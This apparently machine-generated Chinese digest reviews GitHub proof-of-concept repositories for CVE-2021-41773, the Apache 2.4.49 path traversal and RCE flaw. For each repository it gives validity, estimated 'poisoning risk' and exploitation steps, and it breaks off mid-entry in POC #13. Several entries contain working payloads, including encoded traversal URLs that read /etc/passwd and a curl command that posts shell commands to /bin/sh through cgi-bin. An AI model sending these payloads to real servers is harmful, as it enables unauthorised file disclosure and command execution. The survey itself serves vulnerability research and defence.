**利用方式分析：**

利用方式主要有两种：

1.  **路径遍历文件读取：** 攻击者构造包含 URL 编码的路径遍历字符的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取服务器上的敏感文件。POC 代码中的 `pathTraversal` 函数实现了该功能。

2.  **远程命令执行：**  攻击者利用路径遍历漏洞访问 CGI 脚本目录，并向该目录下的 `sh` (或其他 shell 解释器) 传递要执行的命令。POC 代码中的 `remoteCommandExecution` 函数模拟了这一过程，构造包含命令的 POST 请求，发送到目标服务器。注意，利用此方法需要目标服务器配置允许执行 CGI 脚本。

**项目地址:** [0xGabe/Apache-CVEs](https://github.com/0xGabe/Apache-CVEs)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #2

**来源**: [CVE-2021-41773-0xc4t_CVE-2021-41773.md](../2021/CVE-2021-41773-0xc4t_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并且CGI脚本已启用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中存在的一个路径遍历漏洞。攻击者可以通过构造包含特殊字符（如 URL 编码的 '..', 即 '%2e' 或 '%32%65'）的恶意 URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果服务器配置允许 CGI 脚本执行，攻击者还可以利用该漏洞执行任意代码。

**利用方式：**

1.  **路径遍历（LFI）:** 攻击者可以使用包含编码后的 '..' 序列的 URL 来访问服务器上的敏感文件，例如 `/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行（RCE）:** 如果目标服务器的 `/cgi-bin/` 目录启用了 CGI 脚本执行，攻击者可以通过上传恶意脚本并使用路径遍历漏洞来执行它们，例如 `curl 'http://localhost:81/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; whoami'`。

**有效性：**

根据漏洞库信息和搜索结果，提供的 POC 代码是有效的。漏洞库信息中明确指出此漏洞已被在野利用，搜索结果中也提供了大量关于该漏洞的分析和利用方法，POC可以复现LFI和RCE。

**投毒风险：**

此仓库存在轻微的投毒风险（5%），因为攻击者可能会修改 Dockerfile 或 httpd.conf 文件，例如添加恶意的反弹shell脚本到CGI目录，或修改httpd.conf 允许所有目录可访问。 正常的POC验证不会有这种行为, 但是总体上，该仓库主要用于漏洞演示和利用，恶意代码的可能性较低，用户在搭建环境和使用POC时，应该注意检查 Dockerfile 和 httpd.conf 文件。

**项目地址:** [0xc4t/CVE-2021-41773](https://github.com/0xc4t/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #3

**来源**: [CVE-2021-41773-Ask-os_CVE-2021-41773.md](../2021/CVE-2021-41773-Ask-os_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** mod_cgi 必须启用，目标服务器运行 Apache HTTP Server 2.4.49 且相关目录未配置 "require all denied"

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 版本中的一个路径遍历漏洞。该漏洞源于 Apache HTTP Server 在处理 URL 路径时存在缺陷，攻击者可以利用 `/.%2e/` 序列绕过路径规范化检查，从而访问受限目录之外的文件。如果服务器配置允许执行 CGI 脚本，攻击者可以通过构造包含恶意命令的 HTTP 请求执行任意代码，导致远程代码执行（RCE）。

**有效性：**
提供的 POC 代码 (`CVE-2021-42013.py`) 旨在利用此漏洞。它通过 `curl` 命令发送包含路径遍历序列和 shell 命令的 HTTP 请求，从而在目标服务器上执行命令。`README.md` 文件描述了漏洞细节和利用方法，包括依赖项（Python 3 和 `curl`），执行命令的示例，增强了漏洞利用的有效性。

**投毒风险：**
虽然提供的代码旨在利用漏洞，但仍存在轻微的投毒风险的可能性。例如，`README.md` 中可能存在误导信息，导致用户以非预期的方式使用该脚本，或者脚本本身可能包含某些不明显或未记录的功能，但考虑到作者主要目的是复现该漏洞，以及代码整体比较简单，所以推测投毒的可能性为10%。 

**利用方式：**
1.  **路径遍历：** 攻击者利用 URL 中的 `/.%2e/` 序列，尝试访问服务器文件系统上的任意文件。
2.  **CGI 脚本执行：** 如果目标服务器启用了 `mod_cgi` 模块，攻击者可以构造包含恶意命令的 HTTP 请求，并将其发送到 CGI 脚本处理程序。
3.  **远程代码执行：** 服务器执行 CGI 脚本时，会执行攻击者提供的命令，从而实现远程代码执行。

**项目地址:** [Ask-os/CVE-2021-41773](https://github.com/Ask-os/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #4

**来源**: [CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md](../2021/CVE-2021-41773-CyberQuestor-infosec_CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE.md)

## CVE-2021-41773 – Apache HTTP Server 2.4.49 远程代码执行

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历导致远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未授权的攻击者读取任意文件并执行任意代码

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache 2.4.49，并且开启了CGI支持，对Alias配置的目录没有做严格的权限限制（例如 require all denied）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于对路径规范化处理不当导致。攻击者可以利用 `%2e` 等编码字符进行路径遍历攻击，访问受限目录之外的文件。如果服务器启用了 CGI，则可以通过构造包含恶意命令的 HTTP 请求来执行任意代码。

**漏洞利用方式：**

1.  **路径遍历：** 利用 `/.%2e` 序列绕过路径检查，访问受限目录之外的文件。
2.  **CGI 执行：** 访问 `cgi-bin` 目录下的文件（或其他配置为 CGI 处理的目录），并在 POST 数据中注入命令，让服务器执行。
3.  **远程代码执行：** 通过执行 `/bin/bash` 或其他 shell 程序，执行任意系统命令。

**POC有效性：**

根据漏洞库信息、搜索结果和提供的漏洞利用代码（README.md），该POC代码是有效的。漏洞库信息明确指出该漏洞已在野外被利用，搜索结果也证实了这一点。提供的 README.md 详细描述了漏洞的原理、利用方法和演示，并给出了可用的 `curl` 命令示例。

**投毒风险分析：**

分析提供的 README.md 文件， 其中包含的curl命令，本质上是利用漏洞执行bash命令，这个本身是漏洞利用的正常方式，不能算作投毒行为，图片文件没有发现可疑代码.

虽然直接可识别的投毒代码的可能性较低，但仍存在以下潜在风险：

*   **依赖性风险：** 如果 exploit 依赖于外部资源（例如，下载脚本或库），则这些资源可能被篡改，从而引入恶意代码。
*   **隐蔽的 Payload：** 恶意代码可能隐藏在看似无害的注释、变量名或字符串中，需要更深入的代码分析才能发现。
*   **误导性信息：** README.md 文件中的信息可能具有误导性，导致使用者在不知情的情况下执行恶意操作。

综合以上因素，我估计存在10%的投毒风险，主要是考虑到潜在的隐蔽Payload和对外部资源的依赖风险。

为了降低风险，建议：

*   仔细审查所有代码，包括注释和变量名。
*   在隔离的环境中运行 POC 代码。
*   使用最新的安全工具检测潜在的恶意代码。
*   关注与此漏洞相关的安全信息和更新。

**项目地址:** [CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE](https://github.com/CyberQuestor-infosec/CVE-2021-41773-Apache_2.4.49-Path-traversal-to-RCE)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #5

**来源**: [CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md](../2021/CVE-2021-41773-FakesiteSecurity_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** Apache HTTP Server 版本为2.4.49，并且存在Alias-like指令配置，且这些目录下的文件未被"require all denied"保护，CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞信息和搜索结果，CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，如果配置不当，可能导致远程代码执行。

**有效性：**

提供的POC代码（`cve-2021-41773.py`, `cve-2021-41773_RCE.py`, `cve-2021-41773_manual.py`）旨在利用此漏洞。 `cve-2021-41773.py` 尝试读取 `/etc/passwd` 文件以验证漏洞的存在。`cve-2021-41773_RCE.py` 尝试通过 CGI 脚本执行命令。

根据搜索结果，该漏洞在野外被积极利用，因此，提供的POC代码很可能有效，但成功利用取决于目标服务器的配置。

**投毒风险：**

审查提供的POC代码，没有发现明显的恶意代码或后门。代码的功能是扫描目标是否存在漏洞，并尝试利用漏洞读取文件或执行命令。`cve-2021-41773.py`的第49行给出了可以添加常见目录的提示，但本身不具备投毒性。

**利用方式：**

1.  **路径遍历：** 攻击者使用特殊的 URL 编码序列（例如 `/.%2e/%2e%2e/`）来绕过路径规范化，从而访问 Alias-like 指令配置目录之外的文件。
2.  **文件读取：** 如果目标文件没有被 "require all denied" 保护，攻击者可以读取任意文件，例如 `/etc/passwd`，从而获取敏感信息。
3.  **远程代码执行：** 如果 CGI 脚本被启用，攻击者可以通过构造恶意的 URL 和 POST 数据来执行任意代码。例如，`cve-2021-41773_RCE.py` 使用 `/cgi-bin/` 目录，并尝试执行 `uname` 命令。

总而言之，此漏洞的利用需要特定的配置条件，但如果满足条件，则风险非常高。

**项目地址:** [FakesiteSecurity/CVE-2021-41773](https://github.com/FakesiteSecurity/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #6

**来源**: [CVE-2021-41773-Iris288_CVE-2021-41773.md](../2021/CVE-2021-41773-Iris288_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal & Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许未经身份验证的攻击者读取任意文件和执行任意代码。

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like指令配置不当，CGI脚本已启用，且文件系统权限配置不当，未启用'require all denied'。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773 是 Apache HTTP Server 2.4.49 中的一个路径遍历漏洞，由于路径规范化中的更改不当所致。攻击者可以利用此漏洞将 URL 映射到 Alias-like 指令配置目录之外的文件。如果这些目录之外的文件没有受到默认配置 "require all denied" 的保护，这些请求可能会成功。如果还为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含特殊字符（如`.%2e`或`..`）的恶意 URL，绕过服务器的安全检查，访问受限目录之外的文件。
2.  **文件读取：** 成功利用路径遍历后，攻击者可以读取服务器上的任意文件，包括配置文件、源代码等敏感信息。
3.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本，攻击者可以通过上传或修改 CGI 脚本，执行任意系统命令。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，它利用了路径遍历漏洞来实现远程代码执行。

1.  **目标指定：** 脚本接受目标服务器的 IP 地址或域名作为参数。
2.  **命令执行：** 脚本允许用户输入要执行的命令，并通过构造包含路径遍历的 URL 将命令发送到目标服务器。
3.  **CGI利用：** 脚本假设目标服务器存在一个名为 `s3cret-cgi-bin` 的 CGI 目录，并使用该目录来执行命令。通过POST请求发送经过编码的命令，利用了`bin/sh`执行。
4.  **回显结果：** 脚本将目标服务器返回的结果打印到屏幕上。

**有效性分析：**

提供的漏洞信息和搜索结果表明，该漏洞确实存在且已被公开利用。提供的 POC 代码基本符合该漏洞的利用方式，因此可以认为该 POC 代码是有效的。需要满足相应的环境条件（如 Alias 指令配置、CGI 脚本启用、文件权限配置等）

**投毒风险分析：**

检查了提供的 Python 脚本，没有发现任何明显的恶意代码或后门。脚本的功能仅限于利用漏洞执行用户指定的命令。`README.md` 文件也只是对漏洞的简单描述，未包含恶意内容。可以认为该仓库存在投毒代码的风险非常低，风险为0%。

**排序优先级：**
搜索引擎结果提供了漏洞被广泛利用和分析的信息，漏洞利用代码验证了漏洞利用的可行性，漏洞库信息提供了漏洞的基础信息。因此，搜索引擎结果的优先级高于漏洞利用代码，漏洞利用代码的优先级高于漏洞库信息。

**项目地址:** [Iris288/CVE-2021-41773](https://github.com/Iris288/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #7

**来源**: [CVE-2021-41773-JIYUN02_cve-2021-41773.md](../2021/CVE-2021-41773-JIYUN02_cve-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历/RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造特殊的URL，绕过Alias-like指令配置的目录限制，访问到服务器上的任意文件。如果服务器同时开启了CGI脚本执行，攻击者还可以利用该漏洞执行任意代码。

**有效性：**
提供的POC代码构建了一个包含漏洞的Apache HTTP Server 2.4.49环境。Dockerfile使用官方httpd:2.4.49镜像，并将自定义的html文件复制到/usr/local/apache2/htdocs/目录。然后，它安装了bash，并为/usr/local/apache2/htdocs/cgi-bin/test.sh添加了可执行权限。这个Dockerfile本身没有问题，但关键在于test.sh脚本的内容。如果test.sh包含恶意代码，则攻击者可以通过路径遍历漏洞执行它。

**投毒风险：**
Dockerfile只安装了bash,添加了test.sh的执行权限。如果`/tmp/4903a38a210c3406acebc545808a1928/html/cgi-bin/test.sh`脚本内容包含恶意代码，则存在投毒风险。但从dockerfile的内容来看，投毒的概率取决于test.sh,风险较低，大约在10%左右。

**利用方式：**
1.  **路径遍历：** 攻击者可以使用包含`..`序列的URL来遍历文件系统，例如：`http://target:8080/../../../../etc/passwd`，尝试读取服务器上的`/etc/passwd`文件。
2.  **远程代码执行：** 如果目标服务器启用了CGI，攻击者可以使用路径遍历来访问和执行CGI脚本，例如：`http://target:8080/cgi-bin/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fbin/bash -c 'id'`。

**总结：**
漏洞利用的核心在于构造包含特殊字符的URL，绕过服务器的访问控制。如果CGI可用，则可以直接执行代码。利用的成功与否取决于服务器的具体配置和文件权限。

**项目地址:** [JIYUN02/cve-2021-41773](https://github.com/JIYUN02/cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #8

**来源**: [CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md](../2021/CVE-2021-41773-Mahfujurjust_CVE-2021-41773.md)

## CVE-2021-41773-Apache HTTP Server-路径遍历

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且受影响的目录未配置"require all denied"。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 的路径规范化更改中。攻击者可以利用路径遍历攻击将 URL 映射到由 Alias 类指令配置的目录之外的文件。如果这些目录之外的文件不受通常的默认配置“require all denied”保护，则这些请求可能会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

**有效性：**
根据漏洞库信息，该漏洞已被在野利用，说明漏洞的利用具有实际的可能性。

**投毒风险：**
提供的POC代码是一个简单的HTML页面，显示一个404错误页面，并提示存在CVE-2021-41773漏洞。代码本身的功能是展示漏洞的存在，而不包含任何恶意代码。虽然不直接包含投毒代码，但是可能存在间接的风险，例如诱导用户访问恶意网站或执行其他恶意操作。因此，判断投毒风险为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造包含`..`的URL，尝试访问服务器上的任意文件。例如，`http://target/../../../../etc/passwd`尝试读取`/etc/passwd`文件。
2.  **绕过访问控制：** 漏洞利用依赖于Alias指令配置的目录之外的文件没有被"require all denied"保护。如果存在疏忽配置，攻击者可以访问这些文件。
3.  **远程代码执行（可选）：** 如果目标服务器为受影响的别名路径启用了CGI脚本，攻击者可以通过上传并执行恶意CGI脚本来实现远程代码执行。

总而言之，该漏洞利用的有效性高，风险等级为高危，利用方式主要是路径遍历，如果目标环境配置不当，可能造成远程代码执行。

**项目地址:** [Mahfujurjust/CVE-2021-41773](https://github.com/Mahfujurjust/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #9

**来源**: [CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md](../2021/CVE-2021-41773-MatanelGordon_docker-cve-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 2.4.49 版本，并启用 cgi-bin 或类似 Alias 指令配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中，是一个路径遍历漏洞。攻击者可以通过构造包含特殊编码的 URL，例如 `/.%2e/%2e%2e/`，来绕过服务器对路径的规范化处理，从而访问到 Alias 指令配置以外的文件。如果目标服务器同时启用了 CGI 脚本支持，则可能导致远程代码执行。

**漏洞利用有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞的 POC 已被公开，并且在野外被发现利用。提供的 Postman 集合中包含了一个用于获取 `/etc/passwd` 文件的请求，验证了路径遍历的可能性。因此，提供的 POC 代码是有效的。

**投毒风险分析：**

*   `/tmp/04092c8b1881911c9b0f88964abf9b52/CVE-2021-41773.postman_collection.json`：Postman 集合文件，定义了用于测试漏洞的 HTTP 请求。不存在投毒代码。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/Dockerfile`：Dockerfile 用于构建包含漏洞环境的 Docker 镜像。 其中 `RUN ln -sf /bin/bash /bin/sh` 这一行可能存在争议，它将 `/bin/sh` 符号链接强制指向 `/bin/bash`。在某些系统中，`/bin/sh` 可能是 `dash` 或其他更轻量级的 shell。 强制指向 bash 可能会引入一些细微的兼容性问题，但这不是一个明显的恶意行为，更可能是一种为了方便某些脚本执行的措施。此外创建目录 `/etc/httpd/logs`也并不是恶意代码, 综合来看，投毒风险较低。
*   `/tmp/04092c8b1881911c9b0f88964abf9b52/LICENSE`：Apache 许可证，与漏洞利用无关，不存在投毒代码。

综合分析，该仓库中可能存在的投毒代码的可能性较低，主要集中在Dockerfile 脚本中，将`/bin/sh` 符号链接强制指向 `/bin/bash`,但可能性只有5%，其余的代码都是正常的。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/%2e%2e/` 序列的 URL，利用 Apache HTTP Server 对路径的规范化处理缺陷，尝试访问受限目录之外的文件。
2.  **敏感信息泄露：** 如果成功绕过权限验证，攻击者可以读取服务器上的敏感文件，如配置文件、密码文件等。
3.  **远程代码执行（如果 CGI 启用）：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过上传或执行恶意 CGI 脚本，实现远程代码执行。

**项目地址:** [MatanelGordon/docker-cve-2021-41773](https://github.com/MatanelGordon/docker-cve-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #10

**来源**: [CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md](../2021/CVE-2021-41773-Maybe4a6f7365_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行Apache HTTP Server 2.4.49，并且Alias-like指令配置不当，或者CGI脚本已启用。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的一个路径遍历漏洞。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%2e`）的URL，绕过服务器的路径规范化限制，访问Alias-like指令配置目录之外的文件。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断该POC代码有效。漏洞库信息明确指出该漏洞在野外被利用，搜索引擎结果也提供了多个关于该漏洞的解释和利用的文章。POC代码通过构造包含`.%2e`的URL来尝试读取目标服务器上的文件。

**投毒风险：**
分析提供的POC代码，该脚本主要功能是验证目标服务器是否存在CVE-2021-41773漏洞，脚本会检测指定的IP地址是否存在Apache HTTP Server，并尝试通过构造的URL读取指定文件。经验证，该脚本没有发现明显的恶意代码或后门，因此投毒风险较低。投毒风险百分比评估为0%。

**利用方式：**
1.  **确定目标：** 找到运行Apache HTTP Server 2.4.49的目标服务器。
2.  **构造Payload：** 构造包含恶意路径的URL，例如：`http://<target_ip>/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
3.  **发送请求：** 将构造好的URL发送到目标服务器。
4.  **读取文件或执行代码：** 如果目标服务器存在漏洞且配置不当，攻击者可以读取任意文件（如`/etc/passwd`）或执行任意代码（如果CGI脚本已启用）。

需要注意的是，成功利用该漏洞的前提是服务器配置不当，例如没有对Alias-like指令配置的目录之外的文件进行适当的访问控制，或者启用了CGI脚本执行功能。

总而言之，这是一个严重的安全漏洞，可能导致敏感信息泄露和远程代码执行。管理员应尽快升级Apache HTTP Server版本或采取其他缓解措施。

**项目地址:** [Maybe4a6f7365/CVE-2021-41773](https://github.com/Maybe4a6f7365/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #11

**来源**: [CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md](../2021/CVE-2021-41773-MrCl0wnLab_SimplesApachePathTraversal.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and File Disclosure

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且存在Alias-like配置，并允许CGI脚本执行(在RCE场景下)。需要能通过网络访问目标服务器的HTTP服务。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。攻击者可以利用此漏洞，通过构造包含特殊字符（如URL编码的双点）的URL，绕过Alias-like指令配置的目录限制，访问服务器上的任意文件。如果目标服务器同时启用了CGI脚本执行，则攻击者可能进一步利用此漏洞执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及漏洞利用代码分析，可以确认此漏洞POC的有效性。漏洞库信息明确指出该漏洞已被在野利用。搜索引擎结果中也包含大量关于该漏洞的分析和POC。

**投毒风险：**
提供的代码片段是GNU通用公共许可证的文本，并非实际的漏洞利用代码。因此，无法评估其是否包含恶意代码或投毒风险。投毒的可能性为0%。该漏洞的常见利用方式是通过构造包含`..%2f`或类似编码的URL来绕过路径检查，从而访问服务器上的敏感文件，或者如果开启了CGI，甚至可以执行任意代码。 

**利用方式：**
1.  **路径遍历：** 攻击者构造包含路径遍历字符的URL，例如：`/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的`/etc/passwd`文件或其他敏感文件。
2.  **远程代码执行 (RCE):**  如果服务器启用了CGI，攻击者可以将路径遍历与CGI结合，上传恶意CGI脚本，然后通过路径遍历访问该脚本，从而执行任意代码。 例如 `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh` 

**项目地址:** [MrCl0wnLab/SimplesApachePathTraversal](https://github.com/MrCl0wnLab/SimplesApachePathTraversal)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #12

**来源**: [CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md](../2021/CVE-2021-41773-MuhammadHuzaifaAsif_security-lab.md)

## CVE-2021-41773-Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要Apache HTTP Server版本为2.4.49，Alias配置不当，且CGI脚本启用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

根据漏洞库信息和搜索结果，CVE-2021-41773是Apache HTTP Server 2.4.49中的一个路径遍历漏洞。由于路径规范化处理存在缺陷，攻击者可以利用该漏洞将URL映射到Alias指令配置目录之外的文件。如果这些目录之外的文件没有被"require all denied"等默认配置保护，攻击者就可以成功访问这些文件。更严重的是，如果为这些Alias路径启用了CGI脚本，攻击者还可以执行远程代码。

**有效性：**
根据漏洞描述，该漏洞利用较为直接，通过构造包含".."的URL进行路径遍历。从搜索结果来看，存在大量的漏洞分析和利用文章，表明该漏洞利用的有效性较高。

**投毒风险：**
漏洞利用代码仅提供了漏洞分析文档、CVSS评分、环境信息、影响评估和缓解措施。其中`steps_performed.md`缺失，无法得知作者是否进行了真实的漏洞利用和测试。代码仓库主要目的是漏洞分析和缓解建议，并声明未在目标VM上安装Apache，因此实际利用代码缺失。综合判断，该仓库中存在作者隐藏恶意代码进行投毒的概率较低，预估为10%。

**利用方式：**
1.  **路径遍历：** 攻击者构造恶意的HTTP请求，包含特殊编码的路径，例如`..%2f`或`..\`，绕过服务器的路径检查，访问服务器上的任意文件。
2.  **文件泄露：** 成功利用路径遍历后，攻击者可以读取服务器上的敏感文件，如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以通过路径遍历访问CGI脚本，并执行恶意代码。攻击者可以上传包含恶意代码的CGI脚本，并通过路径遍历执行，从而获取服务器的控制权。

**项目地址:** [MuhammadHuzaifaAsif/security-lab](https://github.com/MuhammadHuzaifaAsif/security-lab)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #13

**来源**: [CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md](../2021/CVE-2021-41773-OfriOuzan_CVE-2021-41773_CVE-2021-42013_Exploits.md)

## CVE-2021-41773/CVE-2021-42013 Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且开启了CGI支持，Alias配置不当，并且相关目录未进行权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773和CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历漏洞。攻击者可以利用这些漏洞，通过构造包含特殊字符（如`.%2e`或`.%%32%65`）的URL，绕过服务器的路径检查，访问到Alias指令配置以外的文件。如果目标服务器同时开启了CGI支持，攻击者还可以执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2021-41773已经被证实存在，并且在野外被利用。提供的POC代码也通过Docker构建了易受攻击的环境，并提供了利用脚本，证明了该漏洞的可利用性。

**投毒风险：**

分析POC代码，该代码主要用于构建漏洞环境和执行漏洞利用。虽然代码本身看起来直接，但需要注意以下几点：

*   **Docker镜像来源：** POC需要构建Docker镜像。如果Docker镜像不是来自官方或可信来源，则可能包含恶意软件。
*   **执行任意命令：** RCE相关的POC会执行任意命令，如果攻击者修改了POC代码，可能会导致恶意代码执行。
*   **流量劫持风险：** POC通过curl发送特定请求来触发漏洞，如果网络环境被污染，可能导致流量劫持，使得攻击者可以篡改POC行为。
*   **文件篡改风险：** RCE相关的POC会写`/tmp/exploited`文件，如果服务器的`/tmp`目录权限设置不当，攻击者可以在其他用户不知情的情况下，篡改该文件，从而进一步扩大攻击。

综合以上考虑，认为此POC代码存在一定的投毒风险，但整体比例不高，约为10%。

**利用方式：**

1.  **环境搭建：** 使用Dockerfile构建包含漏洞的Apache HTTP Server环境（2.4.49或2.4.50版本）。
2.  **路径遍历：** 构造包含特殊字符的URL，例如：
    *   `/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd` (针对CVE-2021-41773)
